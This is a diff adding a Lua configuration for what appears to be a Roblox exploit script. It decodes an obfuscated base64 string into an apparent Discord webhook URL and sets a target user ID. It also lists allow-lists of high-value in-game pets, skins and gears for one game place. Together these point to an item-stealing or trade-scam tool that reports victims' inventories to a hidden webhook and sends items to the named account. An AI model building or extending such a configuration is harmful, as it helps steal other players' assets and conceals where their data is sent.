@@ -1,0 +1,170 @@
+local genv = getgenv()
+
+genv.GOOD_WEBHOOK = (function()
+    local d="aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU2MDMzMzU1MTMzNTg5OTE0Ny9uWVgtMUpVRlhlSXFaVElUcndOX2NSY1Zxa3JsMnZPcElCSkkzTU9rQ0pWY1BEam1GQWFDUDdyV055b1k2bFUxdU4yZg=="
+    local B="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+    local o,b={},{}
+    for i=1,#B do b[B:sub(i,i)]=i-1 end
+    local n,bits=0,0
+    for i=1,#d do
+        local c=d:sub(i,i)
+        if c~='=' then
+            local v=b[c]
+            if v then
+                n=n*64+v; bits=bits+6
+                if bits>=8 then bits=bits-8; o[#o+1]=string.char(math.floor(n/2^bits)%256); n=n%2^bits end
+            end
+        end
+    end
+    return table.concat(o)
+end)()
+
+genv.TARGET_USER_ID = 10399330850
+
+genv.GOOD_AVATAR = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"
+
+genv.ALLOWED_ANIMALS = {
+    "Hydra Serpent",
+    "Draculino",
+    "Lionello Casarello",
+    "Orchidox",
+    "Strawberry Elephant",
+    "Meowl",
+    "Skibidi Toilet",
+    "Los Dragons",
+    "La Craft Machine",
+    "Gold and Diamond",
+    "Dragon Cannelloni",
+    "Dragon Gingerini",
+    "Griffin",
+    "Hydra Dragon Cannelloni",
+    "Hydra Bunny",
+    "Antonio",
+    "John Pork",
+    "Elefanto Frigo",
+    "Rubrikiko",
+    "Pancake and Syrup",
+    "Arcadragon",
+    "Rico Dinero",
+    "Capitano Americano",
+    "Kalika Bros",
+    "Tirilikalika Tirilikalako",
+    "Headless Horseman",
+    "Signore Carapace",
+    "Globa Steppa",
+    "Dug Dug Dug",
+    "Fishino Clownino",
+    "4th Bros",
+    "Dragon Aquanini",
+    "Bufalino Boomberino",
+    "La Supreme Combinasion",
+    "La Casa Boo",
+    "Duggy Bros",
+    "Cerberus",
+    "Caylusaurus",
+    "Sammyni Cakini",
+    "Kraken",
+    "Money Money Bros",
+    "Centrucci Nuclucci",
+    "Los Hackers",
+    "Venuspino",
+    "Steakini Fattini",
+    "John Doe",
+    "Rhino Helicopterino",
+    "Gorillo Subwoofero",
+    "Jelly Moby",
+    "Los Tictacs",
+    "Moby Bros",
+    "Foxini Lanternini",
+    "Los Admins",
+    "Bearito Cabinito",
+    "Digi Narwhal",
+    "Los Tangcitos",
+    "67",
+    "Bunny and Eggy",
+    "Capitano Moby",
+    "Cash or Card",
+    "Burguro and Fryuro",
+    "Chipso and Queso",
+    "Cooki and Milki",
+    "Fortunu and Cashuru",
+    "Garama and Madundung",
+    "Fragrama and Chocrama",
+    "Gold Gold Gold",
+    "Coco and Mango",
+    "Los Amigos",
+    "S'more Serat",
+    "La Breakfast Combinasion",
+    "Los Puggies",
+    "Nuclearo Dinossauro",
+    "Rosey and Teddy",
+    "Swaggy Bros",
+    "La Fuse Machine",
+    "Candini Fluffini",
+    "Noodle Noodle Poodle",
+    "Nachorilla",
+    "Sammyni Truckini",
+    "Chicli Chicla",
+    "Scorpino Coasterino",
+    "DJ Panda"
+}
+
+genv.ALLOWED_BASESKINS = {
+    ["Aquatic"] = true,
+    ["Bunny Basket"] = true,
+    ["Candy"] = true,
+    ["Christmas"] = true,
+    ["Cursed"] = true,
+    ["Cyber"] = true,
+    ["Diamond"] = true,
+    ["Divine"] = true,
+    ["Easter"] = true,
+    ["Galaxy"] = true,
+    ["Gingerbread"] = true,
+    ["Gold"] = true,
+    ["Halloween"] = true,
+    ["Lava"] = true,
+    ["Lucky"] = true,
+    ["Octo"] = true,
+    ["Pot of Gold"] = true,
+    ["Radioactive"] = true,
+    ["Rainbow"] = true,
+    ["Rose"] = true,
+    ["Summer"] = true,
+    ["Taco"] = true,
+    ["Valentines"] = true,
+    ["Yin Yang"] = true,
+    ["Tralalero"] = true
+}
+
+genv.ALLOWED_GEARS = {
+    ["Alien Slap"] = true,
+    ["Blackhole Bomb"] = true,
+    ["Bloodmoon Hammer"] = true,
+    ["Bloodmoon Slap"] = true,
+    ["Candy Sentry"] = true,
+    ["Candy Slap"] = true,
+    ["Cupid's Wings"] = true,
+    ["Cursed Slap"] = true,
+    ["Cyber Slap"] = true,
+    ["Demon's Head"] = true,
+    ["Divine Slap"] = true,
+    ["Lava Blaster"] = true,
+    ["Lava Slap"] = true,
+    ["Radioactive Airstrike"] = true,
+    ["Radioactive Slap"] = true,
+    ["Rainbow Hammer"] = true,
+    ["Rainbow Slap"] = true,
+    ["Santa's Sleigh"] = true,
+    ["Waverider"] = true,
+    ["Witch's Broom"] = true,
+    ["Yin Yang Lamp"] = true,
+    ["Yin Yang Slap"] = true,
+    ["Phantom Slap"] = true,
+    ["Crystal Slap"] = true,
+    ["Crystal Hammer"] = true
+}
+
+genv.ALLOWED_PLACE_IDS = {
+    109983668079237
+}
